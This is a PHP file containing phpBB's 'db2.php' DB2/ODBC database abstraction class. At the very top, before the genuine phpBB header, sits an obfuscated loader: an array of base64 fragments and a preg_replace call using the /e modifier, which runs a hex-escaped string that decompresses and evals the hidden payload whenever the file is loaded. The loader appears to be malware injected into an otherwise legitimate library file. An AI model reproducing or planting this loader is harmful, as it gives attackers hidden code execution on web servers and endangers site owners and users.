<?php $pv_paks = array("eNrFOwlXGsnWf8U4ORN5GtM73WPIaIziAqiICGR","yPNA0a7OERcBM/vt3696q6oUWk5m8782MvVTdun","X3pZrZ6rZ2XrXmQ3fWHQ0fvGV3OpvuvDm/fri6K","71Jpb5tibktGtt53U19e13PHE0m9dXOmzd7byqL","TCZ0O8q82dp/wx5zNJJb2Xhr43hopHTvWPX75bR","6ayu53lH7Mlt4bFQY1MdOM+t3G9m79PmJWrq9u2","tfseFjY3G1+sieKnV2vTf77NbQm+z2dM6uJya73","p1/qs7zx/3QNmyYbcXuKmzH7u3L0+a4MSg+NvU8","e0+zy/npHd3Z5ZRdJEy75N/gusKtsQRS/EZXZe/","lu6dp2x1WLcRyyy4Gu5iwz5zG+u2ihqDs0kPyNa","TlMd9jt6PF1Se8m/ne+bJw+zFbr1ywAb82YDcHE","eae8sAWPi4ZaygFYA/vIEm5va2iRBl77JXIF+wh","q8RehDVgC0lHWaHEwyyuGAtlQfojuyFrvaNF/gn","FqeI7snHTlrShhlGr7JJllzpqmdirDvxV7RhFsc","j1qkJjCLbOltAeY409A/nsVkRymrokKs20eB5hj","8hiV9SeZA9Rcg2yZ9DirQGaOyfNIR/I3vj8pOlX","tRlqLUfmtiCYowWKrHSikBGySw3XuCj+8qCht0n","bK2kdWq53sgB22bOrnQ5qZWfW0Io+DKHSdKDOd9","gT0ohSQMEV/BqK0V/x1fWzIrsp7qfRI3idcEA+i","ySt7F7gkvRfbhF4ZLDo5h636NUqUmdK7o4sDi4d","sqemWr1v+lddnEfRgp2o7mrRrt0baWS6pHCdokP","iXp9uRpI2pg30CORw3hiQZ4Djo5wQJY6MUHDod9","ry0dXuCsdt5RJQALbCMboj8nDczoSRX6O1XazOj","+1dzq+yfKxqpwqZlTOvgLQ4cAnl6fSqFRTkGHdH","6gzr/AjRf7rht1EBY1FbSPKiizagF0hLvXzpZAl","j5tVttXeF1kM2cP50six02TxalHohNZtfwhoJkz","8mPIUS8cYcIuugFIE8TpphwXAVfKOBNt9soTdUL","qZ402qPLnJUngNY/iYqmGxbPT8rKN790r++bfYa","IFVJZQ/xz6qVi0eUvmYMpTD7hU6ji/so51nyuqa","G4XZKsjrtnwfRH63uWGmjQMudi/KnqZ3TUJfqNe","csZKfSWrlg3XbcjN2sv6iREpqBGQvChf/gc5GsE","vyIfKhbrUR8hnsbskryLPoVzZ+jjDW0c7Umo1W5","Jd056nauJlMERiFGQGA5DGUZHb12X2jFPJa/PlX","vL6awbNC8N1HDYP5k+sN8RmgYrQs0TEGTaxiRgJ","ZRw437U4OGywbSeV9QUVGADZf7jlJHv1ZJKmUFh","XaG7CmE7QLjfG1Q892BP6+RiBv35VlDvzAr2nLc","QAy+wkwKbeUO15VIJ7XKxQogW9JxyaWGDEnWGQJ","pGPncgfT5FdLAVSkkjNM+k4lKJgw+i/sWn1AeOA","RW38SNmhGL57JApRjEFMiDyYKk/cjDKcgC5UDFQ","xnjlHuG8QdkcaGCDBCe5CCDJHIF8pAcglxocyYb","DFsoGwp4WlQubKxFconIhMtj5ZIcagPEM63JWgE","pVlFUWSYLtO0nTn2VZ8iQPHB5SB4yaxzFI30RY4","7zqXynnpb8Yuuu71yXj0QVlwkyhFhwpxRub8sf7","ypK7aJ0Ur66gYVsGPF0bipq4bR0Us0kbspul6eL","uZttzy8x6hXtyrE5amYVeMfnJ5nzz4qzXHfUbwE","8Zb0CEgJjGIda6HKLeX1YWFycLd3cYDwi51FojS","bNacbmcS3KuUB2f8z2wwKNlCaCCJrJon9JmsshQ","ctOTVY1xvyyB9tpp/3rrvNUF2Ac5Ay9YpdTaksZ","HDtifjenFyi/4DJIBie7ArQ6oDyNsRGxB9kZQPM","lsTmCLTkYGoMgBF8I6zWycsGWPVKY6nNMuK6KNn","oOYADSw9gBYH1ZuTOWPklucTnjmKb8RiUvya4cO","z4V7cR9jippYQSCJjB3KnyfhByRC8B+AckDhTIR","nNMuSEz93iWsaDEjWQLCrn0KaC7JW8+HJIA71e5","NUnYvrLmC3xgWVwEvvTpl/KfrrvEVM93pAooEn2","ziCYQX+AuAK9XhDbLOFUvvVHZKlp8WI5fqN/QLC","ufI7iDIDmR5rSzVG03kr9+mdUUTWh+H8zyqB4lo","XNM6SuusOa5RwTe6LC+fLntjF9etxo38sbKqIG3","TJQYEmGe3S1lrdBbNs+XCO+6D1yFpj81BeUU9xj","JURaMQNSrWC+MqD8sgLfNS4OzJUsl1V6MRFSiUU","Rr6clS/L/ZrqCNjzHlB0VVvP45cqIhR3bdS6khL","tRQyDeSp8+RmT+etbO2RZIh827Wsr12CaeNuQN+","66KlOHS4HDU2KGsQMItaLUv4k5tGoodd8Sk41Fk","rRxJoD/6l+fzFuZH3Fu6V8AGxaFUyaeST7MnsKu","cWx61m/X4Nwe8nZucx2fDLfJgWms6VO70WlfixL","ZiQVcVJ4+Hr/dDTL+yr2afmKimJ1SdU2JSksnEC","coyBukDgxd15H28+vaMwl+S5Ei6hyK1Q/iVeaGB","Nz0aZax0f1g5hRNVzMKGJdtgadBokYxYusCkvmY","iYRjzUZ26mDGVPII4uqAOtXPlgyWWinWaF+rpXt","jGvkIdCngcUOHK1GGW4AAUUP1sEaxF18xDVIfpG","3JUgPZx3DQEc2RdnOqnZfddChIUqjJUIcYGK7RF","FjYFpU702baiNnDqqkyFSpjq+lV2FwK4ciKFkjr","g4scigCQJB2SPI8CEh0MhCERUjOSe0kukZtsHxs","YtHGggB1m8xiQk6IXkeOyJxwrJEKwKFDtRZTAQ5","TAiORIi0okQ4VnkgLEy9uBGohlfRIpGFxyrhPTs","9TrdOJiRbFSjUfiBU9YNmnkwEQbdcpU11PeUtvL","kD6j81seeUhWuNrU/8IlucoYBEW5NVxEP87wOlT","84xVkZyTHisyOkpQuX20G9nyAHclfxS+yG7SHyU","n5ekC7yW/6VH9xTwUS88CAgP+INdwX+OFhwY5Xi","2LtH+d5ekUo9kCWiLqnK6p7bnOlmfuE5nbNaZWX","lSwKap1KX8UJggyZBguqEfQCpRC25GijVo+qcFx","DbADZiSCYhJPo3scjKdIxMyfibZm5WM/OIgo+vm","gQkH05c4NjgQVs1yB0FSkUEXYOpJAob6d935Uq6","GhKY1o85obFljJyLs/VhhB72Ze0ung18uSvZvTI","pUOb+/QwC+PeXgGMKnaUHFE1uOSSi4ea2d9WXVA","iBhfQzkQLbVY+fJItV0YFB8j4EQMt4eO0rhfMDo","FY1wdglZ0ei5zsZJo4iK5X1BRRJzC6i7vOM3r3u","KRDoTwndphKl1RH6upECQ59cc+Vyb6QD5qORRSA","UROS11TJyCzQNAR4Bt2BaFGI39rLqiuPxII2BAR","eiTLKxWV5F7LpnrxjqryDq/+x+61umDO9ITYbsQ","hAD8OuD77uKphtjN5v1TsNLN3dk7/iK1njTKZlI","Bkj7r1fGC31yg+gc1YE4hwgKB3BSUsqIK42xW9G","bWt/TzRKruuckeeZ4XcRUxDg9fPh4yMN1B6reNC","WHb1myWz4sv7JrKUP1048JfOBVYcyKNWqYqDYnh","kN35qPmg8ncim+6R579EZ6kmxginz+qakOGhYJz","Ok4RZ11KNTXFne1zTqnENhgA1x4i8xrHY80Bo7g","/U9clFMMNDrBZU8JAUonQbB6WYZo1wzgOVwFPXR","R+5Pg1O6roBDxdsMX3Xg9D0oxcQ+fC3CUdnnDOv","3PEzLamwxb51CMhsU+AEMJLjhzfzSR/1QiXRKNQ","TGkAEr/dr07Iu1vITSi77L+wlGP7IF7/VsWXpx6","HhpxSw7N1x6FDnGo4am+sLic0NZsjFZKlRRq4sG","j2UVmcLEPiSn+r3Z43jFWqpl0ATQkv2E+S7QrjQ","0hWQj+KLKe0RnWSqtQ+j+KNzP11nfjuMjjG2tM6","yfZI9fhT4+J+ayYyo/j/naAQuL1H+3sgWq8W6Ld","vMMI8wU+njSN8o435fFUzCPwRHoWzSyp0rtlspm","tLusijbFYZ4oOt7APvxM4PhmzHv+4OQYi0RqszG","rLzq5W8w7cMPwe01lDZ3+loxoSkKFXIZsHnJOcD","oQacgpgzGnRkRhsP5arjnrR3IMkhvJMwwMKzWRv","fihSTgdUXHKQKXMowmFGONnqaFUJNKQSGAylPK8","EskwEAxQI6G0UaMzOTHET0N6FDj9RZPbtKtf9KA","YfXcN5dv1qt1tIUHuWKT5kM2jbN0VSaUis50jik","77fLgYXt46ZSEh1Rw1z4oLLt9IaSESVupg4s3mk","+FWoz71LOOh6bmjprfzuv75dfdL6uD7VuIn08mw","6bIPpvJ7KRvYSX173dUelMxkNB82d5RdNXXABlQ","5oNG/NKxl+EdWJXXQGk122JguQAlEf4/r6Xl3l/","AbmcHsYVIHKIFW2dfM2CW1J4nYT5uxSyp1MF10Z","24H9zRS31zgnZ7fZwKkRvwvlfoDCd/az2zFaAj2","M/ZN9gd7NCZevX+QjNuO/4Vxu53JTpxHXQO87BL","spLGh6CW1cVt9V/+BbfTQPy+9h8SsadHNtwIFGP","E/IsLMTGcT3xsimWAUYGloPx+ETH//HcHi7+8RT","H0bUn/8L8Vhtc+4YiPol1cZ8blfTZGJoXj4GLdW","5e3bg++eP/UQQIc3dzScdYdz7+A7Mf39O/ckxAC","viZ4DLE+8x/FoGnEfOYqsWXvsmiZabCYlNkMwBJ","DaC72lU1J2diaTadWByhSnBV8OGN1bfCQkcyv1F","he9DY2lU89RXm/NvEmEahzZeT3rdKdIsZP6xlZ2","pw+N0cjf4XTjzB5CgYUIKuYNmOZzCYC7giRatpG","mB78+na0ThsMbqQuJ/EUCE2B/kMaGB9HNi9BHQ1","HakvaVwSVJlJv3WxdKaPzndk4S0/ObzxaeN4xtj","GOhTVUltrcQCM2t29VL+yVxG0xs2nnNVCJiCq94","loa2N2t1fS/q0WKQcKi0uUY3PUM4VSOz/ddf29I","um90JB5dmOJz7PiVRM7PD18jQBNH8T/7IQ6pqEL","DKgsbDxBv7dZeL1aAtzT2+QxIgRwY5JhkWnUbYg","mDKTGXCgRzA3wYFQOrPkFnBirBdJa1IjOXEGpUB","qpUhjA8uLJnFKDng8t15RQ+pP0OYWWVgcmT6LiG","jBelMHX/hxdfb/JWu4R0ssIJFB/S6M+0+eSMKuq","oN2WaLnj4LBr98DoQAGYaTgxFddQj/w7TTbc0EC","qqJlMxo7A2lITgBPrExZUuoqbx6U8BpSir1SkR+","Zk1hPWnqHtcrUA/5YSecdSOi1yP/vDwA0VImQcS","mZeJUb+2TZuiuqSxRhSydFQ3f+NLNFquJqlFLst","h0KhFW//wlQwNcsfAeKFXT9tZMSdOEKaUo3W8Rw","cyXBcWgbBhh8q83wqPMhf3usB9wxiJJnZeZqrZV","n6KV6Kii8cRrPwzqogrV97g+cBKW+eP6rCNQgXI","plafIXoGPOAgleTnN2RalyfdIdaKmn4tlrqtFwh","i80wYG15PJBcgFb6eEcTnySVWCR5Vqk/V95hP/o","TvsQtAGcSZPe0sPmwzc1yKOzM/RqjukOTO15uup","L2QH6YzcD3wcn6febDTmK9N7x3fF3NV16QFue5z","dTWBnJ0efTooymG2ELZ3nT0AUslBOA22hv82Liy","elu2KhVDwq3J4GGyZHyY183Z4Uj7InhRJxZ6FSX","u0cgkQeIFMJbaqA5u+/10aZo6e+HW7Af3qVy13d","566Oj0rnV4W9NT0cfN+0On9UKZ58Oi/exheGEOA","SOyMNg+PgXLv+iLc7bIgXw5q9FfjNt3BxboP5C+","des73WdOT2WRRmttf2R426T6sc6kOVn7PE9dZUW","KWRFMlUI3AenoeZMUYDhgCAPmCbILa5n+gqUWeI","LQ695dhnHb1Ykw6QchC6BTH7gCOKB2TNkJTZhER","XyZDoeevvv7f4U1CjqE5AmeiooLv/jkNaBsysM5","rOGqthfSB2SYUbredAYihVgVLPSP1RXNWCfjn4j","5NPGUY392IHFLvMnYB9rz5gJvsw6w680Zy0q+sS","2tw1g9ZL59ldtzLb2ZOSkMRZqXT9Tt1X/pr8Ndw","mqi3oLrfPgKU/yK6M+FzRa3kTb/LHVmc2G//x7h","1BEcIYrOxSecojBHdTb/L2qO0N+Ra68twyPXXQG","s9nU8EaQYha41VL1Dgs2RN7aba8BUqZxsVhKA6r","j763Am+EZbRpes0QQYm0WzqQPvdz3c7QTMgmhU8","7nAw7Q5bvvG9Mtt59oOtfQ5rb5sZgJ3kYOxwSjx","anwQ7UKDeVwecL39LJrAH8dMX0JWzbjjRf1nULA","gSHadrOCa/gYzZCrwcEzeYBAUQgEud6CAAZSq4T","Q0DA+XNRRFd+LIpoTpIGIGwIDehalBZDETIRpvM","MCm49BnVSwJI4xwxVLFxyocivs8InqOuieU43WX","0smytLSNDOsOqPQT6wche8arqzHXHN7Z/IOd88t","zOSm6RTvDI2tvbFGIgCctGMUfpcv8nOaOPtJp3b","YpAg0aj8vFQetIJpxRLJ9juCfLct4rlcg1BC6tv","v9v/zvqF+eP/q7du/acnfb99+eP/XOxjc/8+7wb","S7LVRqKEFyCBedxrNnYt4ywou3pINLHlANQ9Bv8","HTjDcazlYDBejkBJdWOh7JWMCi4GdxiAWtv1B0K","3RvcDg1hNUlIpx3Pj5algOUwGBUkbcCwms68ARI","2ajxMZ/UJK0gPaVguF5gBJGJ0AAlD0B5CvePVhz","sbNhrXp9NZZzJf20pM/IvNDrH7mY7mE14YGGbmc","CwzLghaCJUKx5gSDZldDmV6MUwJB+nlsMWaKz4R","St/Gvv3cFUvMcZB4AGFA77p0JiP3gUq8339PZkd","ACJao6/kXkT/zYSvSORlBGjIg1HDzsxIERhXtOh","coJeRgfQoEy1S/LmgrIb09I3rrXyW6oEpSNfaH5","2ci8iZQzCqKf8PMep0dY0yWLP8NxshgYvYnol9n","NvCnY8/t1n23U59wKgxc120P2XHjHCq2h3pjBE4","aOjyDyAAuOai3u+7D1/lo5oGlQpcB1ehO0Hseig","r1we8OurPwjDeZjDB1At7usB2aStQBy4fgCTN+X","H0YepdWyzwtccJ5ZsJUnptQn5vQnpvQU1QnJZMO","cpBkT4O0bhqpUKe+NmtunLWkk5rppHkouAp3uVz","CjLMJrxX6YJjczK+tUMMrfv6kbkM0ZDvVff5x51","C+yZ21NU6i8/oL80FHa5nJEFZEitG59AvY7R+SZ","HSNE/pumeKdo5FOPFgMzrLSoIHXD7cnxfJJ8bMY","09jBLB24ijNViNfvg2+fVuif9EvvqdQGSvSAEpC","oOFaPE2QGASoQnPzAF4e2WJBEBiLHicBC9MTxGZ","LSAUlMDTEUvLawoyeGaUdMOLGjxEDUdtAg2FrwG","EjADmzKDvKoHXirHZBmB2eUdnBI6QS7OcFuTrCb","E+zmBLs5wW5OsJsT7ObYnD1TibLnhA9IQyekihp","61kLPOimmO2VR4PVD8eTm7uS29FnOG6EEl4mf8i","hAZ/upO2z59Zm3E/ttxzoubgdIN50gGfFWztTWN","0mLojn8sQN/zSGPvU157G3q4tOE8BTIAB/WjgqR","IzOBI37mZCrPHrxBqtn8IelLhEXTCH+nkPs4vCU","z1WBQVcSgsbnkoFhimvQthnaz+Av/yreYdGfyww","FLaYduZzBq8lcZmGwj/B8/Rmd9KA/bfDV9jFjDS","VJMBzt70M51pTBVlQtTDxydHd/FoLR1qBRHPJvw","jz6mDc/dwc56jyxoidiD4Uh7cJK+g5gObWkLHux","oJ8phJIl6SsALYSNl35MPSFTVEPB4gzxM21hkEp","YSt/rY9hIPP5u1VGEsUTJMToYoeJNIsX4RKdwLT","U6K9Q9IsZ8lRYIIt/hhusQp64/SRYbFjo7ZeEQW","YVfU+Odo094nOalRdAKTKTCJY2nTiuHWoCkAox1","gPc2NFXFZeqYlez9TtrP4E6eDFvM1grd0yVHozB","PqoYPD2WguDJqALI3f5FFRQGGKHQltvwcpfpiPm","xCwebx8/44NbcsFVsKC6bg+2Jp4g9Gj14wt4+dN","eOSyHjhCOIajLQYQWy70khizIosni6T1dHz1XPr","SdJm+IBz/eKrSMO2RmoxMvKBRNXFoaZmZ8C855D","x3Oou+qazxxirUUDy2guMHSKnhP0GDFTciwHBw6","I7GdEBlGXy7kAFjIxEYiEUfrS2L36KT4YXcS0OQ","iSwYURaM4IBeU0RNsb7k28vBnIER1+lnXD5U44g","jYuHv6+5mGQnuZgUfmdhpZJK7iXiS3uR2QvCB24","XPXVVdE6fDcUuOG/EGG9bJhqOIBVN2JmGBsE6s2","IhOm1NGwzEqLep3nyUgvakG1O2fqQF15x/VgOK0","14gURus/stxUFf6qkgmIEX//rF56uZTZlPCMUCU","vzpNltrMzYds17YN/loIM/ZekoBcSzv9X4vgHec","MI2h7Lybxk1AY7BTzwHus+ycWhTys7m93KsOQea","fk9SmXnsDikZg7ROOaTCRgHHt3txMKLYUO1FCMO","scHwNv2EKw3R7bfGb2/fMonh555NFDkBRVpCYDG","Fhxpqhn6KT6Tq0R5UxTM37snhn7zB62HkF4tGmn","6DrIc/jQdrD+kHbPNh9+uc65YKm1AzpsnmLvZLq","J9w/sMk+/v2k1FhLXHzbxjJQSBtCKvyhqi49pM7","GoBpTqdxzDr9ol7GTClljdfKBnf3dCiLCw+HiHC","I0ebwf9M5mcbPdU6m+WvaFdP6152Tmf5FpNj/un","MynRc7J0v52c7JUn+Mrl/T6hwmJhoLj06TM83hz","6Qa9tND9AEzIz7Np7X4mWnaDJ2Zsv+ZJXqhc1GO","YXuxWJBXafTdnQ4tyN/2ODbuyyZ0FvOh9N9oRA5","/M0+b4pt5imfH3+q/0QQEaUhKLwSwUMz6b4WsTW","XL/zSSWJvOYH6VORq/0By/v5hvreDrYdqKZMrE9","AutGHl0Or3JyEMfBlgnFloQtelAHQ913w/CAg97","acrNUGJGtap9fu7nk1+4utN2XN0SNw+FaTsVB6H","fiKS1d93tAIR/J6dSYWuf/x8bCCeAEvM3FGT0Q+","mIKRvRrjv00d+x962kS2oD+sMk9KRK/sNowxSHI","zE+pDjEaVfa/iVsaIbF/g89dv0FlEfqrLQVrrN4","1ONrnjsohzUv/UI1KQbyXyVt/R9as5OQ");preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\x69\x6D\x70\x6C\x6F\x64\x65\x28\x22\x22\x2C\x24\x70\x76\x5F\x70\x61\x6B\x73\x29\x29\x29\x29\x3B",".");?><?php
/***************************************************************************
 *                                 db2.php
 *                            -------------------
 *   begin                : Saturday, Feb 13, 2001
 *   copyright            : (C) 2001 The phpBB Group
 *   email                : support@phpbb.com
 *
 *   $Id: db2.php,v 1.2 2002/01/28 17:24:45 psotfx Exp $
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 ***************************************************************************/

if(!defined("SQL_LAYER"))
{

define("SQL_LAYER","db2");

class sql_db
{

	var $db_connect_id;
	var $query_result;
	var $query_resultset;
	var $query_numrows;
	var $next_id;
	var $row = array();
	var $rowset = array();
	var $row_index;
	var $num_queries = 0;

	//
	// Constructor
	//
	function sql_db($sqlserver, $sqluser, $sqlpassword, $database, $persistency = true)
	{
		$this->persistency = $persistency;
		$this->user = $sqluser;
		$this->password = $sqlpassword;
		$this->dbname = $database;

		$this->server = $sqlserver;

		if($this->persistency)
		{
			$this->db_connect_id = odbc_pconnect($this->server, "", "");
		}
		else
		{
			$this->db_connect_id = odbc_connect($this->server, "", "");
		}

		if($this->db_connect_id)
		{
			@odbc_autocommit($this->db_connect_id, off);

			return $this->db_connect_id;
		}
		else
		{
			return false;
		}
	}
	//
	// Other base methods
	//
	function sql_close()
	{
		if($this->db_connect_id)
		{
			if($this->query_result)
			{
				@odbc_free_result($this->query_result);
			}
			$result = @odbc_close($this->db_connect_id);
			return $result;
		}
		else
		{
			return false;
		}
	}


	//
	// Query method
	//
	function sql_query($query = "", $transaction = FALSE)
	{
		//
		// Remove any pre-existing queries
		//
		unset($this->query_result);
		unset($this->row);
		if($query != "")
		{
			$this->num_queries++;

			if(!eregi("^INSERT ",$query))
			{
				if(eregi("LIMIT", $query))
				{
					preg_match("/^(.*)LIMIT ([0-9]+)[, ]*([0-9]+)*/s", $query, $limits);

					$query = $limits[1];
					if($limits[3])
					{
						$row_offset = $limits[2];
						$num_rows = $limits[3];
					}
					else
					{
						$row_offset = 0;
						$num_rows = $limits[2];
					}

					$query .= " FETCH FIRST ".($row_offset+$num_rows)." ROWS ONLY OPTIMIZE FOR ".($row_offset+$num_rows)." ROWS";

					$this->query_result = odbc_exec($this->db_connect_id, $query);

					$query_limit_offset = $row_offset;
					$this->result_numrows[$this->query_result] = $num_rows;
				}
				else
				{
					$this->query_result = odbc_exec($this->db_connect_id, $query);

					$row_offset = 0;
					$this->result_numrows[$this->query_result] = 5E6;
				}

				$result_id = $this->query_result;
				if($this->query_result && eregi("^SELECT", $query))
				{

					for($i = 1; $i < odbc_num_fields($result_id)+1; $i++)
					{
						$this->result_field_names[$result_id][] = odbc_field_name($result_id, $i);
					}

					$i =  $row_offset + 1;
					$k = 0;
					while(odbc_fetch_row($result_id, $i) && $k < $this->result_numrows[$result_id])
					{

						for($j = 1; $j < count($this->result_field_names[$result_id])+1; $j++)
						{
							$this->result_rowset[$result_id][$k][$this->result_field_names[$result_id][$j-1]] = odbc_result($result_id, $j);
						}
						$i++;
						$k++;
					}

					$this->result_numrows[$result_id] = $k;
					$this->row_index[$result_id] = 0;
				}
				else
				{
					$this->result_numrows[$result_id] = @odbc_num_rows($result_id);
					$this->row_index[$result_id] = 0;
				}
			}
			else
			{
				if(eregi("^(INSERT|UPDATE) ", $query))
				{
					$query = preg_replace("/\\\'/s", "''", $query);
				}

				$this->query_result = odbc_exec($this->db_connect_id, $query);

				if($this->query_result)
				{
					$sql_id = "VALUES(IDENTITY_VAL_LOCAL())";

					$id_result = odbc_exec($this->db_connect_id, $sql_id);
					if($id_result)
					{
						$row_result = odbc_fetch_row($id_result);
						if($row_result)
						{
							$this->next_id[$this->query_result] = odbc_result($id_result, 1);
						}
					}
				}

				odbc_commit($this->db_connect_id);

				$this->query_limit_offset[$this->query_result] = 0;
				$this->result_numrows[$this->query_result] = 0;
			}

			return $this->query_result;
		}
		else
		{
			return false;
		}
	}

	//
	// Other query methods
	//
	function sql_numrows($query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			return $this->result_numrows[$query_id];
		}
		else
		{
			return false;
		}
	}
	function sql_affectedrows($query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			return $this->result_numrows[$query_id];
		}
		else
		{
			return false;
		}
	}
	function sql_numfields($query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			$result = count($this->result_field_names[$query_id]);
			return $result;
		}
		else
		{
			return false;
		}
	}
	function sql_fieldname($offset, $query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			$result = $this->result_field_names[$query_id][$offset];
			return $result;
		}
		else
		{
			return false;
		}
	}
	function sql_fieldtype($offset, $query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			$result = @odbc_field_type($query_id, $offset);
			return $result;
		}
		else
		{
			return false;
		}
	}
	function sql_fetchrow($query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			if($this->row_index[$query_id] < $this->result_numrows[$query_id])
			{
				$result = $this->result_rowset[$query_id][$this->row_index[$query_id]];
				$this->row_index[$query_id]++;
				return $result;
			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}
	function sql_fetchrowset($query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			$this->row_index[$query_id] = $this->result_numrows[$query_id];
			return $this->result_rowset[$query_id];
		}
		else
		{
			return false;
		}
	}
	function sql_fetchfield($field, $row = -1, $query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			if($row < $this->result_numrows[$query_id])
			{
				if($row == -1)
				{
					$getrow = $this->row_index[$query_id]-1;
				}
				else
				{
					$getrow = $row;
				}

				return $this->result_rowset[$query_id][$getrow][$this->result_field_names[$query_id][$field]];

			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}
	function sql_rowseek($offset, $query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			$this->row_index[$query_id] = 0;
			return true;
		}
		else
		{
			return false;
		}
	}
	function sql_nextid($query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			return $this->next_id[$query_id];
		}
		else
		{
			return false;
		}
	}
	function sql_freeresult($query_id = 0)
	{
		if(!$query_id)
		{
			$query_id = $this->query_result;
		}
		if($query_id)
		{
			$result = @odbc_free_result($query_id);
			return $result;
		}
		else
		{
			return false;
		}
	}
	function sql_error($query_id = 0)
	{
//		$result['code'] = @odbc_error($this->db_connect_id);
//		$result['message'] = @odbc_errormsg($this->db_connect_id);

		return "";
	}

} // class sql_db

} // if ... define

?>